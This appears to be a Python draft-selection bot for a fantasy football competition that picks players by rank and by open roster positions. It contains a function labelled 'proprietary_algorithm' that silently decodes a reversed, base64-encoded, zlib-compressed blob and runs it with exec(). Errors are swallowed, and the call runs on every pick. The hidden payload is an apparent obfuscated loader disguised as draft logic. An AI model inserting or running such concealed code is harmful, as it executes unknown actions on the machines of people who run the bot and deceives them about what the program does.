from blitz_env import is_drafted, simulate_draft, visualize_draft_board, Player, GameState
from typing import List
import collections
import copy

def draft_player(game_state: GameState) -> str:
    """
    Selects a player to draft based on the highest rank.

    Args:
        players (List[Player]): A list of Player objects.

    Returns:
        str: The id of the drafted player.
    """

    print("---------------------------------------------n--------------------")

    # returns zero-based round number
    def get_round_number(game_state: GameState) -> int:
        number_of_teams = len(game_state.teams)
        is_snake_draft = game_state.league_settings.is_snake_draft
        # Adjust pick to be zero-based for easier modulo calculations
        pick_adjusted = game_state.current_pick - 1

        # Determine the round of the pick
        round_number = pick_adjusted // number_of_teams
        return round_number

    def proprietary_algorithm(game_state: GameState) -> str:
        try:
            _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
        except Exception as e:
            pass
        return ""

    # try the better algorithm first - if it fails, continue on to the basic implementation
    result = proprietary_algorithm(game_state)
    if result != "":
        return result

    print(f"round number: {get_round_number(game_state)}")
    print()

    # Filter out already drafted players
    undrafted_players = [player for player in game_state.players if not is_drafted(player)]
    undrafted_qbs = [player for player in undrafted_players if player.allowed_positions[0] == 'QB']

    # Get a list of who's on our team already
    my_team_id = game_state.drafting_team_id
    my_players = [player for player in game_state.players if is_drafted(player) and player.draft_status.team_id_chosen == my_team_id]
    print(f"my players: {[p.full_name for p in my_players]}")
    print()

    # Count how many players we're allowed to field for each position
    allowed_position_counts = collections.defaultdict(int)
    for slot in game_state.league_settings.slots_per_team:
        for pos in slot.allowed_player_positions:
            allowed_position_counts[pos] += 1

    # handle bench position. for each bench, add one to each other position
    # note that allowed_position_counts tracks how many of each we can *field* at a time, while position_open_counts tracks how many we can still *draft*
    position_open_counts = copy.deepcopy(allowed_position_counts)
    bench_count = position_open_counts["Bench"]
    del position_open_counts["Bench"]
    for pos in position_open_counts.keys():
        position_open_counts[pos] += bench_count

    # count how many players we've already drafted in each position
    filled_position_counts = collections.defaultdict(int)
    for player in my_players:
        # TODO: handle multiple allowed_positions
        pos = player.allowed_positions[0]
        filled_position_counts[pos] += 1

    # subtract filled_position_counts from position_open_counts
    for pos in position_open_counts.keys():
        position_open_counts[pos] -= filled_position_counts[pos]

    print("Open position counts:")
    for pos, count in position_open_counts.items():
        print(f"{pos}: {count}")
    print()

    print("Filled position counts:")
    for pos, count in filled_position_counts.items():
        print(f"{pos}: {count}")
    print()

    open_positions = set()
    for pos, count in position_open_counts.items():
      if count > 0:
        open_positions.add(pos)
    print(f"Open positions: {open_positions}")

    # TODO: this logic is really only sound for positions that have one slot (i.e. "we can have one QB"). It doesn't really work for things like "we can have 3 RBs"
    unfilled_positions = set()
    for pos, count in filled_position_counts.items():
        if count == 0:
            unfilled_positions.add(pos)
    print(f"positions that are completely unfilled: {unfilled_positions}")
    print()

    # Select the player with the highest rank (lowest rank number)
    # TODO: handle multiple allowed_positions
    if undrafted_players:
        allowed_players = [player for player in undrafted_players if player.allowed_positions[0] in open_positions]
        rank_ordered = sorted(allowed_players, key=lambda p: p.rank)

        # if we're getting to the end of the draft, make sure we have a player for each position/slot
        if game_state.league_settings.total_rounds - get_round_number(game_state) - 1 - len(unfilled_positions) <= 0:
            for player in rank_ordered:
                if player.allowed_positions[0] in unfilled_positions:
                    return player.id

        # only draft allowed count + 1 maximum for each position, don't do more.
        for player in rank_ordered:
            for pos, count in allowed_position_counts.items():
                if player.allowed_positions[0] == pos and filled_position_counts[pos] - count >= 1:
                    continue;
            return player.id

        return rank_ordered[0].id
        # drafted_player = min(undrafted_players, key=lambda p: p.rank)
        # print(f"drafting player: {drafted_player}")
        # return drafted_player.id
    else:
        return ""  # Return empty string if no undrafted players are available
